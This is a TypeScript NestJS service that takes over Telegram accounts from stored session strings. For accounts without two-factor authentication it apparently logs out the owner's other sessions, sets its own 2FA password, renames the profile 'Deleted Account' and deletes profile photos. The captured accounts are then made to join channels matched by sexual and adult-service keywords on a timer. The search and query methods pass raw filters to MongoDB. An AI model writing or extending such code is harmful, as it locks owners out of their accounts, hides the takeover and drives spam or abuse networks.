import { Channel } from './../channels/schemas/channel.schema';
import { BadRequestException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { CreateBufferClientDto } from './dto/create-buffer-client.dto';
import { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';
import { TelegramService } from '../Telegram/Telegram.service';
import { sleep } from 'telegram/Helpers';
import { UsersService } from '../users/users.service';
import { ActiveChannelsService } from '../activechannels/activechannels.service';
import { parseError } from '../../utils';
import { ClientService } from '../clients/client.service';
import { UpdateBufferClientDto } from './dto/update-buffer-client.dto';

@Injectable()
export class BufferClientService {
    private joinChannelMap: Map<string, Channel[]> = new Map();
    private joinChannelIntervalId: NodeJS.Timeout;
    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,
        @Inject(forwardRef(() => TelegramService))
        private telegramService: TelegramService,
        @Inject(forwardRef(() => UsersService))
        private usersService: UsersService,
        @Inject(forwardRef(() => ActiveChannelsService))
        private activeChannelsService: ActiveChannelsService,
        @Inject(forwardRef(() => ClientService))
        private clientService: ClientService,
    ) { }

    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {
        const newUser = new this.bufferClientModel(bufferClient);
        return newUser.save();
    }

    async findAll(): Promise<BufferClient[]> {
        return this.bufferClientModel.find().exec();
    }

    async findOne(mobile: string): Promise<BufferClient> {
        const user = await this.bufferClientModel.findOne({ mobile }).exec();
        if (!user) {
            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }


    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {
        const updatedUser = await this.bufferClientModel.findOneAndUpdate(
            { mobile },
            { $set: updateClientDto },
            { new: true, upsert: true, returnDocument: 'after' }
        ).exec();

        if (!updatedUser) {
            throw new NotFoundException(`User with mobile ${mobile} not found`);
        }

        return updatedUser;
    }

    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {
        const existingUser = await this.bufferClientModel.findOne({ mobile }).exec();
        if (existingUser) {
            console.log("Updating")
            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);
        } else {
            console.log("creating")
            return this.create(createOrUpdateUserDto as CreateBufferClientDto);
        }
    }

    async remove(mobile: string): Promise<void> {
        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
    }
    async search(filter: any): Promise<BufferClient[]> {
        console.log(filter)
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }
        }
        console.log(filter)
        return this.bufferClientModel.find(filter).exec();
    }

    async executeQuery(query: any): Promise<BufferClient[]> {
        try {
            if (!query) {
                throw new BadRequestException('Query is invalid.');
            }
            return await this.bufferClientModel.find(query).exec();
        } catch (error) {
            throw new InternalServerErrorException(error.message);
        }
    }

    removeFromBufferMap(key: string) {
        this.joinChannelMap.delete(key)
    }
    clearBufferMap() {
        console.log("BufferMap cleared")
        this.joinChannelMap.clear()
    }

    async joinchannelForBufferClients(): Promise<string> {
        console.log("Joining Channel Started")
        await this.telegramService.disconnectAll();
        await sleep(2000);
        const clients = await this.bufferClientModel.find({ channels: { "$lt": 180 } }).limit(4);
        clients.map(async (document) => {
            try {
                const client = await this.telegramService.createClient(document.mobile, false, false);
                console.log("Started Joining for : ", document.mobile)
                const channels = await client.channelInfo(true);
                console.log("Existing Channels Length : ", channels.ids.length);
                const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
                const result = await this.activeChannelsService.getActiveChannels(150, 0, keys, channels.ids);
                this.joinChannelMap.set(document.mobile, result);
                // console.log("DbChannelsLen: ", result.length);
                // let resp = '';
                // this.telegramService.joinChannels(document.mobile, result);
            } catch (error) {
                parseError(error)
            }
        })
        this.joinChannelQueue();
        console.log("Joining Channel Triggered Succesfully")
        return "Initiated Joining channels"
    }

    async joinChannelQueue() {
        this.joinChannelIntervalId = setInterval(async () => {
            console.log("In JOIN CHANNEL interval: ", new Date().toISOString());

            const keys = Array.from(this.joinChannelMap.keys());
            const promises = keys.map(async mobile => {
                const channels = this.joinChannelMap.get(mobile);
                if (channels && channels.length > 0) {
                    const channel = channels.shift();
                    console.log(mobile, " Pending Channels :", channels.length)
                    this.joinChannelMap.set(mobile, channels);
                    try {
                        await this.telegramService.createClient(mobile);
                        console.log(mobile, " Trying to join :", channel.username);
                        await this.telegramService.tryJoiningChannel(mobile, channel);
                    } catch (error) {
                        parseError(error, "Outer Err: ");
                    }
                    await this.telegramService.deleteClient(mobile);
                } else {
                    this.joinChannelMap.delete(mobile);
                }
            });
            await Promise.all(promises);
        }, 3 * 60 * 1000);
    }

    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
        }
    }

    async setAsBufferClient(
        mobile: string,
        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]
    ) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new BadRequestException('user not found');
        }
        const clients = await this.clientService.findAll();
        const clientIds = clients.map(client => client.mobile);
        if (!clientIds.includes(mobile)) {
            const telegramClient = await this.telegramService.createClient(mobile)
            try {
                await telegramClient.set2fa();
                await sleep(15000)
                await telegramClient.updateUsername('');
                await sleep(3000)
                await telegramClient.updatePrivacyforDeletedAccount();
                await sleep(3000)
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await sleep(3000)
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true)
                await this.telegramService.deleteClient(mobile)
                const bufferClient = {
                    tgId: user.tgId,
                    session: user.session,
                    mobile: user.mobile,
                    createdDate: (new Date(Date.now())).toISOString().split('T')[0],
                    availableDate,
                    channels: channels.ids.length,
                    updatedDate: (new Date(Date.now())).toISOString().split('T')[0]
                }
                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();
                return "Client set as buffer successfully";
            } catch (error) {
                const errorDetails = parseError(error)
                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))
            }
        } else {
            throw new BadRequestException("Number is a Active Client")
        }
    }

    async checkBufferClients() {
        await this.telegramService.disconnectAll()
        await sleep(2000);
        const clients = await this.findAll();
        const goodIds = [];
        const badIds = [];
        if (clients.length < 40) {
            for (let i = 0; i < 40 - clients.length; i++) {
                badIds.push(1)
            }
        }
        for (const document of clients) {
            console.log(document)
            try {
                const cli = await this.telegramService.createClient(document.mobile, true, false);
                //Comment below line after 1-2 days
                await this.telegramService.updateUsername(document.mobile, '');
                const hasPassword = await cli.hasPassword();
                if (!hasPassword) {
                    badIds.push(document.mobile);
                    await this.remove(document.mobile);
                } else {
                    const channelinfo = await this.telegramService.getChannelInfo(document.mobile);
                    await this.bufferClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.canSendTrueCount, updatedDate: (new Date(Date.now())).toISOString().split('T')[0] })
                    console.log(document.mobile, " :  ALL Good");
                    goodIds.push(document.mobile)
                }
                await this.telegramService.deleteClient(document.mobile)
                await sleep(2000);
            } catch (error) {
                console.log(document.mobile, " :  false");
                badIds.push(document.mobile);
                this.remove(document.mobile)
                await this.telegramService.deleteClient(document.mobile)
            }
        }
        console.log(badIds, goodIds);
        this.addNewUserstoBufferClients(badIds, goodIds);
    }

    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {
        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, twoFA: false }, { lastActive: 1 }, badIds.length + 3);
        console.log("documents : ", documents.length)
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            try {
                try {
                    const client = await this.telegramService.createClient(document.mobile);
                    const hasPassword = await client.hasPassword();
                    console.log("hasPassword: ", hasPassword);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        console.log("waiting for setting 2FA");
                        await sleep(30000);
                        await client.updateUsername('');
                        await sleep(3000)
                        await client.updatePrivacyforDeletedAccount();
                        await sleep(3000)
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await sleep(3000)
                        await client.deleteProfilePhotos();
                        const channels = await client.channelInfo(true)
                        console.log("Inserting Document");
                        const bufferClient = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            createdDate: (new Date(Date.now())).toISOString().split('T')[0],
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                            updatedDate: (new Date(Date.now())).toISOString().split('T')[0],
                        }
                        await this.create(bufferClient);
                        console.log("=============Created BufferClient=============")
                        await this.telegramService.deleteClient(document.mobile)
                        badIds.pop();
                    } else {
                        console.log("Failed to Update as BufferClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true })
                        await this.telegramService.deleteClient(document.mobile)
                    }
                } catch (error) {
                    console.log(error);
                    await this.telegramService.deleteClient(document.mobile)
                }
            } catch (error) {
                console.error("An error occurred:", error);
            }
        }
        setTimeout(() => {
            this.joinchannelForBufferClients()
        }, 2 * 60 * 1000);
    }
}
